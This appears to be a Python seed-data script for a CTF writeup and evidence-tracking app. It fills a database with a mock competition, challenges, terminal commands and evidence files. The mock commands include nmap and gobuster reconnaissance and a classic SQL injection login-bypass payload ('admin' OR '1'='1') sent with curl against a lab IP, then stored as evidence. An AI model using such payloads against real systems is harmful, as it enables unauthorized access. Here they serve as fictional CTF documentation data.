import datetime
from sqlalchemy.orm import Session
from app.models.competition import Competition
from app.models.challenge import Challenge
from app.models.session import Session as CTFSession, TerminalCommand, TimelineEvent
from app.models.evidence import Evidence
from app.models.writeup import WriteupDocument
from app.services.rule_engine import RuleEngineService
from app.services.evidence_vault import EvidenceVaultService

def populate_seed_data(db: Session):
    # Check if competition already exists
    if db.query(Competition).first():
        return

    comp_id = "COMP-DEFCAMP26"
    comp = Competition(
        id=comp_id,
        name="DefCamp World CTF 2026",
        website="https://def.camp/ctf",
        start_date=datetime.datetime.utcnow() - datetime.timedelta(days=1),
        end_date=datetime.datetime.utcnow() + datetime.timedelta(days=2),
        submission_deadline=datetime.datetime.utcnow() + datetime.timedelta(days=3),
        status="active",
        rules_summary="Writeups permitted only after contest end. Flags must be redacted. Mandatory screenshot proof of shell.",
        official_rules_url="https://def.camp/rules"
    )
    db.add(comp)
    db.commit()

    # Default rules
    RuleEngineService.get_or_create_default_rules(db, comp.id)

    # Challenge 1: Web
    chal1 = Challenge(
        id="CHAL-WEB-001",
        competition_id=comp_id,
        name="Quantum Infiltrator",
        category="Web",
        difficulty="Medium",
        points=350,
        description="A telemetry portal runs on port 5000. Find the hidden administrator interface and extract the flag.",
        author="Spectre",
        flag="flag{sql1_2_auth_byp4ss_0921}",
        tools_used=["nmap", "gobuster", "sqlmap", "curl"],
        vulnerabilities=["SQL Injection", "Authentication Bypass"],
        solution_status="solved",
        evidence_status="verified",
        writeup_status="drafting"
    )
    db.add(chal1)

    # Challenge 2: Pwn
    chal2 = Challenge(
        id="CHAL-PWN-002",
        competition_id=comp_id,
        name="Binary Pulse",
        category="Pwn",
        difficulty="Hard",
        points=450,
        description="A vulnerable 64-bit ELF binary listening on netcat port 9001. Bypass NX and ASLR with a ROP chain.",
        author="Ret2Libc",
        flag="flag{r0p_ch41n_b1nsh_succ3ss_882}",
        tools_used=["checksec", "gdb-gef", "pwntools", "ROPgadget"],
        vulnerabilities=["Stack Buffer Overflow", "Return-Oriented Programming"],
        solution_status="solved",
        evidence_status="verified",
        writeup_status="not_started"
    )
    db.add(chal2)
    db.commit()

    # Session for Challenge 1
    session_id = "SES-REC-001"
    session = CTFSession(
        id=session_id,
        competition_id=comp_id,
        challenge_id=chal1.id,
        name="Web Exploitation Run",
        status="active",
        shell_type="powershell",
        working_directory="C:\\CTF\\DefCamp2026\\Web",
        started_at=datetime.datetime.utcnow() - datetime.timedelta(hours=2)
    )
    db.add(session)
    db.commit()

    # Terminal Commands
    cmds = [
        ("nmap -sC -sV -p 80,5000 10.10.11.23", "PORT     STATE SERVICE VERSION\n80/tcp   open  http    nginx 1.18.0\n5000/tcp open  http    Werkzeug 3.0.1 (Python 3.11.4)", 0, 1420, "Reconnaissance"),
        ("gobuster dir -u http://10.10.11.23:5000 -w /usr/share/wordlists/dirb/common.txt", "/login (Status: 200) [Size: 1423]\n/api/telemetry (Status: 401) [Size: 45]\n/admin (Status: 302) -> /login", 0, 3100, "Reconnaissance"),
        ("curl -i -X POST http://10.10.11.23:5000/login -d \"user=admin' OR '1'='1&pass=foo\"", "HTTP/1.0 302 FOUND\nLocation: /admin\nSet-Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ...; Path=/", 0, 320, "Vulnerability Identification"),
        ("curl -s -H \"Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ...\" http://10.10.11.23:5000/admin/flag", "{\"status\": \"success\", \"flag\": \"flag{sql1_2_auth_byp4ss_0921}\"}", 0, 210, "Flag Retrieval")
    ]

    for c_str, stdout, code, dur, step in cmds:
        cmd_rec = TerminalCommand(
            id=f"CMD-{step[:3].upper()}-{dur}",
            session_id=session_id,
            challenge_id=chal1.id,
            command=c_str,
            stdout=stdout,
            exit_code=code,
            duration_ms=dur,
            cwd="C:\\CTF\\DefCamp2026\\Web",
            shell="powershell",
            is_evidence=True,
            user_note=f"Verified step for {step}"
        )
        db.add(cmd_rec)
        
        evt = TimelineEvent(
            id=f"EVT-{dur}",
            session_id=session_id,
            challenge_id=chal1.id,
            event_type="command" if "flag" not in c_str else "flag_retrieval",
            title=f"Executed: {c_str[:40]}",
            description=f"Returned exit code {code} ({dur}ms)",
            suggested_step=step,
            timestamp=datetime.datetime.utcnow() - datetime.timedelta(minutes=dur//10)
        )
        db.add(evt)

    db.commit()

    # Evidence items
    mock_scan_bytes = b"Nmap 7.94 scan report for 10.10.11.23\nHost is up (0.045s latency).\n80/tcp open http\n5000/tcp open werkzeug"
    EvidenceVaultService.store_evidence_file(
        db=db,
        competition_id=comp_id,
        challenge_id=chal1.id,
        original_filename="nmap_initial_scan.txt",
        file_bytes=mock_scan_bytes,
        category="network_scan",
        file_type="text/plain",
        session_id=session_id,
        solution_step="Reconnaissance",
        user_description="Initial port scan showing open Werkzeug service on port 5000"
    )

    mock_http_bytes = b"POST /login HTTP/1.1\nHost: 10.10.11.23:5000\nContent-Type: application/x-www-form-urlencoded\n\nuser=admin' OR '1'='1&pass=foo"
    EvidenceVaultService.store_evidence_file(
        db=db,
        competition_id=comp_id,
        challenge_id=chal1.id,
        original_filename="auth_bypass_payload.http",
        file_bytes=mock_http_bytes,
        category="http_traffic",
        file_type="text/plain",
        session_id=session_id,
        solution_step="Vulnerability Identification",
        user_description="HTTP request proving SQL injection vulnerability in user login parameter"
    )

    print("[+] Seed database populated with realistic CTF scenario.")
